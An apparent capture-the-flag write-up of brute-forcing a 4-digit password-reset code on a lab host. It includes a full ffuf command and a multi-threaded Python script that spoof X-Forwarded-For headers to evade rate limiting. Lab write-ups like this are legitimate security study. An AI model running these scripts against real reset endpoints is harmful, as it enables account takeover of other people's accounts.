This project implements a brute force attack on a password reset system using a recovery code to reset the password. The goal of this project is to use various techniques to bypass restrictions such as Rate Limiting to speed up the process of finding the correct recovery code and resetting the password.

What I did:
Initial Reconnaissance:
At the initial stage, I analyzed the target system to understand how the password recovery works. I discovered a password reset page that accepts a recovery code for further actions. I also found that the server had mechanisms for rate limiting requests.

Using Burp Suite:
After discovering the password reset page, I used the Burp Suite tool to capture and analyze the traffic. During this process, I noticed that the recovery code was a 4-digit number and was passed in the requests. I also observed that the system could handle recovery attempts but had restrictions on the number of requests.

Creating Wordlists for Brute Force:
To bypass the restrictions, I created two wordlists:

One with possible recovery codes from 0000 to 9999.
The other with fake IP addresses used to bypass IP-based rate limiting.
Using FFUF Tool:
For the attack on the password reset system, I used the FFUF (Fuzz Faster U Fool) tool. I configured it to use both wordlists to brute force the recovery codes and fake IP addresses. Additionally, I limited the number of requests using the -rate flag to control the attack speed.

Command Example to Launch the Attack:

bash
Copy
Edit
ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://10.10.143.105:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=YOUR_SESSION_ID" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt
Python Script Implementation for Brute Forcing:
I wrote a Python script to automate the brute force attack on the recovery code. The script uses multi-threading to increase performance and allows rapid testing of all possible recovery codes from 0000 to 9999.

Key Points of the Script:

The requests library is used to send POST requests to the server.
Multi-threading is utilized with the threading module to perform parallel requests.
Random IP addresses are generated via the X-Forwarded-For header to bypass rate limiting.
Python Script Example:

python
Copy
Edit
import requests
import random
import threading

url = "http://10.10.143.105:1337/reset_password.php"
stop_flag = threading.Event()
num_threads = 50

def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "Invalid or expired recovery code!" not in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Printing the response: ")
                    print(r.text)
                    return
        except Exception as e:
            pass

def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
Results and Successfully Finding the Code:
After performing the brute force attack, I found the correct recovery code (1028), which can be used to reset the password on the site.

Password Reset:
Using the found recovery code, I successfully reset the password for the user. On the password reset page, I was presented with a form to enter a new password, which I used to complete the task.

What was Achieved:
Successfully performed a brute force attack on the password reset system.
Bypassed request limits (Rate Limiting) using fake IP addresses.
Obtained the correct recovery code for password reset.
This project is a good example of how various tools and techniques can be used to successfully attack systems that have protections like brute force prevention and rate limiting.
